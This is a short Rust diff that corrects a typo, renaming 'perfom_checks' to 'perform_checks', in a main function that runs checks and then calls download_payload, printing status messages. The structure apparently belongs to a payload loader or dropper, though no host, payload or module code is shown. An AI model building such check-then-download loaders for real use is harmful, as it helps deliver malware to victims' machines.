@@ -1,12 +1,12 @@
 mod checks;
 mod downloader;
 
-use crate::checks::checks::{perfom_checks};
+use crate::checks::checks::{perform_checks};
 use crate::downloader::downloader::download_payload;
 
 fn main() {
 
-    if perfom_checks() {
+    if perform_checks() {
         println!("[!] All Checks OK ✔️");
         if download_payload() {
             println!("[!] Payload Downloaded ✔️");
